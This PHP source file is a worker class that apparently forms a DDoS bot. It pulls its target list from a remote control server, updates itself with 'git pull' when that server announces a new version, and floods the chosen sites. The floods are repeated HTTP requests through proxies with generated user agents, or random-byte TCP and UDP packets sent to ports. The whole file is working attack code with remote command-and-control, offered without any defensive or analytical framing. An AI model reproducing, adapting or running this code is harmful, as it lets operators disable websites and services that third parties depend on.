<?php

namespace app\worker;

class Requester
{
    private $sessionMaxRequests = 100;

    private $data;

    private $filename;

    private $requestLog;

    private $startTime;

    private $flushInterval = 5;

    private $site;
    
    private $requestCount;

    private $isInitialized = false;

    private $appConfig;

    private $runtimeConfig;

    public function __construct($filename)
    {
        $this->filename = $filename;

        $this->appConfig = require(__DIR__ . '/../config.php');

        $this->isInitialized = $this->initialize();
    }

    public function initialize(): bool
    {
        // reading config; check for updates
        $runtimeDir = dirname($this->filename);
        chdir($runtimeDir);

        $configFilename = $runtimeDir . '/config.json';
        if(file_exists($configFilename)) {
            if(is_readable($configFilename)) {
                $this->runtimeConfig = json_decode(file_get_contents($configFilename), true);
                $configLoaded = true;
            } else {
                unlink($configFilename);
                $configLoaded = false;
            }
        } else {
            $configLoaded = false;
        }

        if(!$configLoaded) {
            $this->runtimeConfig = [
                'checkForUpdates' => true,
                'uid' => uniqid(),
            ];
            file_put_contents($configFilename, json_encode($this->runtimeConfig));

            // prevent from race condition
            return false;
        }

        $content = file_get_contents('http://atack.just-for-some.fun/hosts.json');
        $contentArray = json_decode($content, true);

        if(
            isset($this->runtimeConfig['checkForUpdates']) && $this->runtimeConfig['checkForUpdates'] &&
            isset($contentArray['config']['version'])
        ) {
            if(version_compare($contentArray['config']['version'], $this->appConfig['version'], '>')) {
                exec('git pull');
                return false;
            }
        }

        $hosts = $contentArray['hosts'];

        $hostUrl = null;
        $prioritySumm = .0;
        foreach($hosts as &$host) {
            if(is_string($host)) {
                $host = [
                    'url' => $host,
                    'priority' => 1.0,
                ];
            } elseif(is_array($host)) {
                if(!isset($host['priority'])) {
                    $host['priority'] = 1.0;
                }
            }

            $host['priorityStart'] = $prioritySumm;
            $prioritySumm += $host['priority'];
        }
        unset($host);

        $randomMax = 1000000;
        $randomFloat = rand(0, $randomMax) / (float) $randomMax * $prioritySumm;
        foreach($hosts as $host) {
            if(
                $host['priorityStart'] <= $randomFloat &&
                ($host['priorityStart'] + $host['priority']) > $randomFloat
            ) {
                $hostUrl = $host['url'];
                break;
            }
        }

        if(empty($hostUrl)) {
            $hostUrl = $hosts[array_rand($hosts)];
        }

        $data = @file_get_contents($hostUrl);

        if(!$data) {
            throw new \Exception('Error get data from ' . $hostUrl);
        }

        $this->data = json_decode($data, true, 512, JSON_THROW_ON_ERROR);
        $this->startTime = new \DateTime();
        $this->requestCount = 0;

        return true;
    }

    public function execute(): bool
    {
        if(!$this->isInitialized) {
            return false;
        }

        $time = time();
        try {
            if(isset($this->data['sites'])) {
                $this->site = $this->data['sites'][array_rand($this->data['sites'])];
            } else {
                $this->site = $this->data['site'];
            }

            if(isset($this->site['points']) && is_array($this->site['points'])) {
                $point = $this->site['points'][array_rand($this->site['points'])];
                $protocol = $point['protocol'] ?? 'http';
                $port = $point['port'] ?? ($protocol === 'http' ? 80 : null);
            } else {
                $protocol = 'http';
                $port = 80;
            }

            if($protocol === 'http') {
                $code = $this->request($this->site['page']);
            }

            if($protocol === 'http' && $code != 200){
                foreach ($this->data['proxy'] as $proxy) {
                    while (true) {
                        $code = $this->request($this->site['page'], $proxy['ip'], $proxy['auth']);
                        if($code == 407) {
                            break;
                        }
                        if(++$this->requestCount > $this->sessionMaxRequests){
                            break;
                        }
                        if((time() - $time) > $this->flushInterval) {
                            $this->flushStatus();
                            $time = time();
                        }
                    }
                }
            } else {
                while (true) {
                    $this->request($this->site['page'], false, false, $protocol, $port);
                    if(++$this->requestCount > $this->sessionMaxRequests){
                        break;
                    }
                    if((time() - $time) > $this->flushInterval) {
                        $this->flushStatus();
                        $time = time();
                    }
                }
            }
        } catch (\Exception $e) {
            sleep(1);
        }

        $this->flushStatus();

        return true;
    }

    protected function flushStatus()
    {
        file_put_contents($this->filename, serialize([
            'url' => $this->site['page'],
            'startTime' => $this->startTime,
            'endTime' => new \DateTime(),
            'requestLog' => $this->requestLog,
        ]));
    }

    protected function request($url, $ip = false, $auth = false, $protocol = 'http', $port = null)
    {
        switch($protocol) {
            case 'http':
                $userAgent = (new UserAgent)->generate();

                $curl = curl_init($url);
                if(empty($curl)) {
                    echo 'Cannot open url ' . $url . "\r\n";
                    return 0;
                }

                curl_setopt($curl, CURLOPT_URL, $url);
                curl_setopt($curl, CURLOPT_USERAGENT, $userAgent);
                curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($curl,CURLOPT_CONNECTTIMEOUT,10);
                curl_setopt($curl,CURLOPT_TIMEOUT,15);
                if($ip) curl_setopt($curl, CURLOPT_PROXY, $ip);
                if($auth) curl_setopt($curl, CURLOPT_PROXYUSERPWD, $auth);

                curl_exec($curl);
                $httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
                $requestTime = (float) curl_getinfo($curl, CURLINFO_TOTAL_TIME_T) / 1000;
                curl_close($curl);

                break;

            case 'tcp':
            case 'udp':
                if($port === null) {
                    $port = rand(0, 65000);
                }

                $out = random_bytes(4095);

                $microtime = microtime(true);
                try {
                    $fp = fsockopen($protocol . '://' . $url, $port, $errno, $errstr, 5);
                    if($fp){
                        fwrite($fp, $out);
                        fclose($fp);
                        $httpCode = $protocol;
                    } else {
                        $httpCode = substr($protocol, 0, 2) . '_';
                    }
                } catch(\Exception $ex) {
                    $httpCode = substr($protocol, 0, 2) . '~';
                }
                $requestTime = microtime(true) - $microtime;

                $ip = false;

                break;

            default:
                return '~';
        }

        $this->requestLog[] = [
            'httpCode' => $httpCode,
            'withProxy' => $ip && $auth,
            'responseTime' => $requestTime,
        ];

        return $httpCode;
    }
}
